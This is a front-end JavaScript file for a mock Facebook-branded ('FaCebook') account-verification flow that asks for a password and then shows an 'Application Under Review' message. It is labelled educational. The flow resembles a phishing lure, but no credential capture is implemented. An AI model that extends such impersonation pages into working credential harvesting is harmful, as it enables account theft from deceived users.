// Navigation functions
function goToVerification() {
  window.location.href = '/verification.html';
}

// Form handling
document.addEventListener('DOMContentLoaded', () => {
  const verificationForm = document.getElementById('verificationForm');
  const passwordForm = document.getElementById('passwordForm');

  // Add input focus effects
  document.querySelectorAll('.form-input').forEach(input => {
    input.addEventListener('focus', () => {
      input.parentElement.classList.add('focused');
    });
    
    input.addEventListener('blur', () => {
      input.parentElement.classList.remove('focused');
    });
  });

  if (verificationForm) {
    verificationForm.addEventListener('submit', (e) => {
      e.preventDefault();
      
      const submitBtn = verificationForm.querySelector('button[type="submit"]');
      submitBtn.classList.add('loading');
      submitBtn.disabled = true;

      setTimeout(() => {
        window.location.href = '/password.html';
      }, 1500);
    });
  }

  if (passwordForm) {
    passwordForm.addEventListener('submit', async (e) => {
      e.preventDefault();
      
      const submitButton = passwordForm.querySelector('button[type="submit"]');
      submitButton.classList.add('loading');
      submitButton.disabled = true;

      // Simulate API call
      await new Promise(resolve => setTimeout(resolve, 2000));

      // Fade out current content
      document.body.style.opacity = '0';
      document.body.style.transition = 'opacity 0.3s ease';

      setTimeout(() => {
        // Show thank you message
        document.body.innerHTML = `
          <div class="container" style="text-align: center; padding-top: 100px;">
            <h1 class="landing-logo">FaCebook</h1>
            <div class="landing-form" style="margin: 40px auto;">
              <h2>Thank You! Application Under Review</h2>
              <p>We will notify you once your verification is complete.</p>
              <div class="warning-banner">
              </div>
            </div>
          </div>
          <footer class="footer">
            This project is not affiliated with Meta or Facebook. For educational use only.
          </footer>
        `;
        document.body.style.opacity = '1';
      }, 300);
    });
  }

  // Add smooth scrolling
  document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function (e) {
      e.preventDefault();
      document.querySelector(this.getAttribute('href')).scrollIntoView({
        behavior: 'smooth'
      });
    });
  });
});

// Prevent form resubmission on page refresh
if (window.history.replaceState) {
  window.history.replaceState(null, null, window.location.href);
}